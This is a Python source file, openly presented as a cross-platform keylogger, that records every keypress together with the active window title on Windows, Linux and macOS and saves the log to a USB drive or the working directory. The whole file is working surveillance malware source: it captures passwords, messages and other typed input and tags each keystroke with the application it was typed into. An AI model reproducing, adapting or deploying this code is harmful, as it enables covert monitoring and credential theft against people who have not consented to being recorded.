"""
Keylogger with Cross-Platform Support
Author: Bilel Graine
Version: 1.0
Description: This script logs key presses along with the active window title.
             It supports Windows, Linux, and macOS, and can monitor USB removal
             for Linux and macOS to stop the keylogger when the USB is removed.
"""

import logging
from pynput import keyboard
import platform
import os
import time
import threading

# Cross-platform settings for log file location
def get_log_file_path():
    """
    Determines the log file location based on the operating system.
    - For Windows: Uses the current working directory.
    - For Linux: Uses the USB mount path under /media/username/.
    - For macOS: Uses the USB mount path under /Volumes/.
    """
    os_name = platform.system()
    if os_name == "Windows":
        # Log file stored in the current working directory for Windows
        return os.path.join(os.getcwd(), "key_log.txt")
    elif os_name == "Linux":
        # Log file stored in the mounted USB directory for Linux
        return "/media/username/USB_NAME/key_log.txt"
    elif os_name == "Darwin":  # macOS
        # Log file stored in the mounted USB directory for macOS
        return "/Volumes/USB_NAME/key_log.txt"
    else:
        raise Exception("Unsupported Operating System")

# Set up logging
log_file = get_log_file_path()
logging.basicConfig(
    filename=log_file, 
    level=logging.DEBUG, 
    format="%(asctime)s: %(message)s"  # Include timestamps in log entries
)

# Function to get active window title
def get_active_window():
    """
    Captures the title of the currently active window.
    - For Windows: Uses win32gui to fetch the active window title.
    - For Linux: Uses Xlib to fetch the active window title.
    - For macOS: Uses AppKit to fetch the name of the frontmost application.
    """
    try:
        os_name = platform.system()
        if os_name == "Windows":
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif os_name == "Linux":
            from Xlib import display
            d = display.Display()
            window = d.get_input_focus().focus
            return window.get_wm_name() if window else "Unknown Window"
        elif os_name == "Darwin":  # macOS
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            return active_app.localizedName()
        else:
            return "Unsupported OS"
    except Exception as e:
        # Fallback for cases where window title can't be captured
        return f"Error capturing window title: {e}"

# Keylogger functions
def on_press(key):
    """
    Logs key presses along with the active window title.
    """
    active_window = get_active_window()  # Fetch the active window title
    try:
        # Log standard key presses (letters, numbers, etc.)
        logging.info(f"[{active_window}] Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (e.g., Enter, Shift)
        logging.info(f"[{active_window}] Special key pressed: {key}")

def on_release(key):
    """
    Stops the keylogger when the 'Esc' key is pressed.
    """
    if key == keyboard.Key.esc:  # Check if the 'Esc' key is released
        return False

# USB Detection (Linux and macOS only)
def monitor_usb_removal():
    """
    Monitors if the USB is removed on Linux and macOS.
    Stops the keylogger if the USB is disconnected.
    """
    while True:
        if not os.path.exists(log_file):
            print("USB removed. Stopping keylogger.")
            os._exit(0)  # Immediately terminate the program
        time.sleep(5)  # Check for USB presence every 5 seconds

# Main keylogger function
def start_keylogger():
    """
    Starts the keylogger:
    - Monitors USB presence (for Linux and macOS).
    - Captures key presses and releases.
    """
    # Start USB monitoring in a separate thread
    usb_thread = threading.Thread(target=monitor_usb_removal)
    usb_thread.daemon = True  # Ensure the thread exits when the main program exits
    usb_thread.start()

    # Start listening for key press and release events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Entry point
if __name__ == "__main__":
    """
    Entry point for the script:
    - Initializes logging.
    - Starts the keylogger.
    """
    try:
        print(f"Starting keylogger. Logs will be saved to: {log_file}")
        start_keylogger()
    except KeyboardInterrupt:
        # Gracefully handle keyboard interrupts (Ctrl+C)
        print("Keylogger stopped.")
